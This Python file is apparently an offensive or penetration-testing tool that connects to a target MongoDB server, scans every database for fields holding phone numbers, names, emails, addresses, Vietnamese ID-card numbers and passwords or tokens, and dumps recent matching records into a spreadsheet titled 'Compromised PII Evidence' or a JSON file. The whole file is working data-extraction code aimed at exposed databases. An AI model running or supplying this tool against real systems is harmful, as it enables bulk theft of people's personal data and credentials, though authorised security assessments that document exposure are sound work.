import json
import re
import datetime
from typing import Dict, Any, List, Optional

import click

try:
    from openpyxl import Workbook
    from openpyxl.styles import Font, PatternFill, Alignment, Border, Side
    HAS_OPENPYXL = True
except ImportError:
    HAS_OPENPYXL = False

PII_FIELDS = {
    "phone": ["phone", "mobile", "tel", "telephone", "sdt", "dien_thoai", "so_dien_thoai",
              "receiver_mobile", "customer_mobile", "contact_phone"],
    "name": ["name", "full_name", "fullname", "ho_ten", "ten", "customer_name",
             "receiver_name", "contact_name"],
    "email": ["email", "mail", "e_mail"],
    "address": ["address", "dia_chi", "addr", "street", "customer_address",
                "receiver_address", "delivery_address"],
    "id_card": ["cmnd", "cccd", "id_card", "identity", "citizen_id", "so_cmnd"],
}

SECRET_FIELDS = ["password", "passwd", "pwd", "secret", "token", "api_key", "apikey",
                 "access_key", "private_key", "jwt", "bearer", "credential", "auth"]

VN_PHONE_RE = re.compile(r"^0[3-9]\d{8}$")
EMAIL_RE = re.compile(r"^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$")


def _flatten(doc: dict, prefix: str = "") -> dict:
    flat = {}
    for k, v in doc.items():
        key = f"{prefix}.{k}" if prefix else k
        if isinstance(v, dict):
            flat.update(_flatten(v, key))
        else:
            flat[key] = v
    return flat


def _detect_pii_fields(docs: List[dict]) -> Dict[str, List[str]]:
    found = {cat: set() for cat in PII_FIELDS}
    found["secrets"] = set()

    for doc in docs[:50]:
        flat = _flatten(doc)
        for field_path, value in flat.items():
            field_lower = field_path.lower().split(".")[-1]
            for cat, patterns in PII_FIELDS.items():
                if any(p in field_lower for p in patterns):
                    found[cat].add(field_path)
            if any(p in field_lower for p in SECRET_FIELDS):
                found["secrets"].add(field_path)

            if isinstance(value, str):
                if VN_PHONE_RE.match(value) and "phone" not in str(found):
                    found["phone"].add(field_path)
                if EMAIL_RE.match(value):
                    found["email"].add(field_path)

    return {k: sorted(v) for k, v in found.items() if v}


def _get_nested(doc: dict, path: str):
    parts = path.split(".")
    current = doc
    for part in parts:
        if isinstance(current, dict):
            current = current.get(part, "")
        else:
            return ""
    if isinstance(current, datetime.datetime):
        return current.strftime("%Y-%m-%d %H:%M:%S")
    return str(current) if current else ""


class PIIExtractor:
    def __init__(self, host: str, port: int = 27017, username: str = "",
                 password: str = "", auth_db: str = "admin"):
        self.host = host
        self.port = port
        self.username = username
        self.password = password
        self.auth_db = auth_db
        self.client = None
        self.stats = {"total_pii": 0, "databases": {}, "pii_fields": {}}

    def connect(self) -> bool:
        try:
            import pymongo
            kwargs = {"host": self.host, "port": self.port,
                      "serverSelectionTimeoutMS": 10000}
            if self.username:
                kwargs["username"] = self.username
                kwargs["password"] = self.password
                kwargs["authSource"] = self.auth_db
            self.client = pymongo.MongoClient(**kwargs)
            self.client.admin.command("ping")
            return True
        except Exception as e:
            click.echo(f"[-] Connection failed: {e}")
            return False

    def scan_pii(self, sample_size: int = 50) -> Dict[str, Any]:
        click.echo(f"\n[*] Scanning for PII in MongoDB {self.host}:{self.port}...")
        results = {}

        for db_name in self.client.list_database_names():
            if db_name in ("admin", "config", "local"):
                continue
            db = self.client[db_name]
            db_results = {}

            for coll_name in db.list_collection_names():
                count = db[coll_name].estimated_document_count()
                if count == 0:
                    continue

                docs = list(db[coll_name].find({}, {"_id": 0}).limit(sample_size))
                pii_fields = _detect_pii_fields(docs)
                if pii_fields:
                    db_results[coll_name] = {
                        "count": count,
                        "pii_fields": pii_fields,
                        "sample_size": len(docs),
                    }
                    pii_count = sum(len(v) for v in pii_fields.values())
                    click.echo(f"  [!] {db_name}.{coll_name}: {count:,} docs, "
                             f"{pii_count} PII field types detected")
                    for cat, fields in pii_fields.items():
                        click.echo(f"      {cat}: {', '.join(fields)}")

            if db_results:
                results[db_name] = db_results

        self.stats["pii_fields"] = results
        return results

    def extract_pii(self, limit: int = 200, databases: Optional[List[str]] = None) -> List[dict]:
        click.echo(f"\n[*] Extracting latest {limit} PII records...")
        records = []
        per_collection = max(limit // 3, 50)

        target_dbs = databases or list(self.stats.get("pii_fields", {}).keys())
        if not target_dbs:
            target_dbs = [n for n in self.client.list_database_names()
                          if n not in ("admin", "config", "local")]

        for db_name in target_dbs:
            db = self.client[db_name]
            db_pii = self.stats.get("pii_fields", {}).get(db_name, {})

            for coll_name in db.list_collection_names():
                coll_info = db_pii.get(coll_name, {})
                pii_fields = coll_info.get("pii_fields", {})
                if not pii_fields:
                    docs = list(db[coll_name].find({}, {"_id": 0}).limit(20))
                    pii_fields = _detect_pii_fields(docs)
                    if not pii_fields:
                        continue

                docs = list(
                    db[coll_name].find({}, {"_id": 0})
                    .sort([("$natural", -1)])
                    .limit(per_collection)
                )
                for doc in docs:
                    flat = _flatten(doc)
                    record = {"_source": f"{db_name}.{coll_name}"}
                    has_pii = False
                    for cat, fields in pii_fields.items():
                        for field in fields:
                            val = _get_nested(doc, field)
                            if val:
                                record[f"{cat}:{field.split('.')[-1]}"] = val
                                has_pii = True
                    if has_pii:
                        records.append(record)

                if len(records) >= limit:
                    break
            if len(records) >= limit:
                break

        records = records[:limit]
        self.stats["total_pii"] = len(records)
        click.echo(f"  [+] Extracted {len(records)} PII records")
        return records

    def export_excel(self, records: List[dict], output_path: str,
                     target_name: str = "") -> str:
        if not HAS_OPENPYXL:
            click.echo("[-] openpyxl not installed. Run: pip install openpyxl")
            return ""

        wb = Workbook()
        header_font = Font(bold=True, color="FFFFFF", size=11)
        header_fill = PatternFill(start_color="C00000", end_color="C00000", fill_type="solid")
        border = Border(
            left=Side(style="thin"), right=Side(style="thin"),
            top=Side(style="thin"), bottom=Side(style="thin"),
        )

        by_source = {}
        for rec in records:
            src = rec.get("_source", "unknown")
            by_source.setdefault(src, []).append(rec)

        first = True
        for source, docs in by_source.items():
            sheet_name = source.replace(".", "_")[:31]
            ws = wb.active if first else wb.create_sheet(sheet_name)
            if first:
                ws.title = sheet_name
                first = False

            all_keys = []
            for d in docs:
                for k in d:
                    if k != "_source" and k not in all_keys:
                        all_keys.append(k)

            headers = ["#"] + [k.split(":")[-1] for k in all_keys]
            for col, h in enumerate(headers, 1):
                cell = ws.cell(row=1, column=col, value=h)
                cell.font = header_font
                cell.fill = header_fill
                cell.alignment = Alignment(horizontal="center")
                cell.border = border

            for row_idx, doc in enumerate(docs, 2):
                ws.cell(row=row_idx, column=1, value=row_idx - 1).border = border
                for col_idx, key in enumerate(all_keys, 2):
                    val = doc.get(key, "")
                    cell = ws.cell(row=row_idx, column=col_idx, value=str(val))
                    cell.border = border

            for col in range(1, len(headers) + 1):
                ws.column_dimensions[chr(64 + min(col, 90))].width = 22

        ws_summary = wb.create_sheet("Impact Summary")
        ws_summary.sheet_properties.tabColor = "C00000"

        summary = [
            [f"{target_name or self.host} - Compromised PII Evidence"],
            [""],
            ["Source", "Records", "PII Fields"],
        ]
        for src, docs in by_source.items():
            fields = set()
            for d in docs:
                fields.update(k for k in d if k != "_source")
            summary.append([src, str(len(docs)), ", ".join(sorted(fields))])

        summary.append([""])
        summary.append(["TOTAL", str(len(records)), ""])
        summary.append([""])
        summary.append(["Target", f"{self.host}:{self.port}", ""])
        summary.append(["Date", datetime.datetime.now().strftime("%Y-%m-%d"), ""])

        for r, row_data in enumerate(summary, 1):
            for c, val in enumerate(row_data, 1):
                cell = ws_summary.cell(row=r, column=c, value=val)
                cell.border = border
                if r == 1:
                    cell.font = Font(bold=True, size=14, color="C00000")
                if r == 3:
                    cell.font = header_font
                    cell.fill = header_fill

        ws_summary.column_dimensions["A"].width = 35
        ws_summary.column_dimensions["B"].width = 15
        ws_summary.column_dimensions["C"].width = 50

        wb.save(output_path)
        click.echo(f"[+] Excel saved: {output_path}")
        return output_path

    def export_json(self, records: List[dict], output_path: str) -> str:
        class Encoder(json.JSONEncoder):
            def default(self, o):
                if isinstance(o, (datetime.datetime, datetime.date)):
                    return o.isoformat()
                return str(o)

        with open(output_path, "w", encoding="utf-8") as f:
            json.dump(records, f, cls=Encoder, ensure_ascii=False, indent=2)
        click.echo(f"[+] JSON saved: {output_path}")
        return output_path

    def run(self, limit: int = 200, output: str = "pii_evidence.xlsx",
            format: str = "excel", target_name: str = "") -> Dict[str, Any]:
        if not self.connect():
            return {"error": "Connection failed"}

        pii_map = self.scan_pii()
        records = self.extract_pii(limit)

        if format in ("excel", "xlsx", "all"):
            xlsx_path = output if output.endswith(".xlsx") else f"{output}.xlsx"
            self.export_excel(records, xlsx_path, target_name)

        if format in ("json", "all"):
            json_path = output.replace(".xlsx", ".json") if output.endswith(".xlsx") else f"{output}.json"
            self.export_json(records, json_path)

        click.echo(f"\n{'='*50}")
        click.echo("PII Extraction Summary")
        click.echo(f"{'='*50}")
        click.echo(f"  Target: {self.host}:{self.port}")
        click.echo(f"  Total PII records: {len(records)}")
        click.echo(f"  Databases with PII: {len(pii_map)}")
        for db, colls in pii_map.items():
            for coll, info in colls.items():
                cats = list(info.get("pii_fields", {}).keys())
                click.echo(f"    {db}.{coll}: {info['count']:,} docs [{', '.join(cats)}]")

        return {"records": records, "stats": self.stats, "pii_map": pii_map}


def mongo_pii(host: str, port: int = 27017, username: str = "", password: str = "",
              auth_db: str = "admin", limit: int = 200, output: str = "pii_evidence.xlsx",
              format: str = "excel", target_name: str = "") -> Dict[str, Any]:
    extractor = PIIExtractor(host, port, username, password, auth_db)
    return extractor.run(limit, output, format, target_name)
